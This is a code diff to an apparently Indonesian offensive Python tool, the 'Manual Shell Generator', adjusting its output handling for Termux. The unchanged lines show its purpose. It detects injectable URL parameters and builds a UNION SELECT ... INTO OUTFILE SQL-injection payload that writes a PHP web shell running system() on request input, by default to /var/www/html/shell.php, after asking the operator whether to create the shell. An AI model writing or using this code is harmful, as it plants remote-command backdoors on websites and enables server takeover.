@@ -3,7 +3,7 @@
 
 # --[MAI]-- Manual Shell Generator
 # Author: JunedXsec
-# Version: 5.0 - Manual Execution Mode
+# Version: 5.1 - Fixed for Termux
 
 import sys
 import os
@@ -43,8 +43,8 @@ C = {
 }
 
 print_lock = threading.Lock()
-def safe_print(msg): 
-    with print_lock: 
+def safe_print(msg):
+    with print_lock:
         print(msg)
 
 def clear_screen():
@@ -58,7 +58,7 @@ def log_banner():
     safe_print(f"{C['BOLD']}{C['CYAN']}--[MAI]-- Manual Shell Generator{C['RESET']}")
     safe_print(f"{C['BOLD']}Author: JunedXsec{C['RESET']}")
     safe_print("Mode: Tidak auto upload, hanya generate payload untuk dieksekusi manual")
-    safe_print()
+    safe_print("")   # Baris kosong (sudah pakai argumen)
 
 # ==================== HTTP ====================
 session = requests.Session()
@@ -212,7 +212,7 @@ def generate_shell_payload(base_url, param, original_value, trigger, num_cols, s
     shell_code = "<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}?>"
     nulls = ['NULL'] * num_cols
     nulls[0] = f"'{shell_code}'"
-    # Untuk string based (sudah terdeteksi)
+    # Gunakan trigger yang sudah dideteksi (biasanya "'" untuk string based)
     payload = f"{original_value}{trigger} UNION SELECT {','.join(nulls)} INTO OUTFILE '{shell_path}'-- -"
     full_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
     return full_url, payload
@@ -236,13 +236,15 @@ def scan_endpoint(url, params_dict):
         if union_extract(url, param, orig_val, inj_type, trigger, num_cols):
             log_success(f"Parameter {param} rentan! Sekarang generate shell.")
             while True:
-                print(f"\n{C['WARNING']}[?] Buat shell? (y/n): {C['RESET']}", end='')
+                sys.stdout.write(f"\n{C['WARNING']}[?] Buat shell? (y/n): {C['RESET']}")
+                sys.stdout.flush()
                 ans = sys.stdin.readline().strip().lower()
                 if ans == 'y':
                     parsed = urllib.parse.urlparse(url)
                     base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                     default_path = "/var/www/html/shell.php"
-                    print(f"{C['CYAN']}Masukkan path shell (default: {default_path}): {C['RESET']}", end='')
+                    sys.stdout.write(f"{C['CYAN']}Masukkan path shell (default: {default_path}): {C['RESET']}")
+                    sys.stdout.flush()
                     shell_path = sys.stdin.readline().strip()
                     if not shell_path:
                         shell_path = default_path
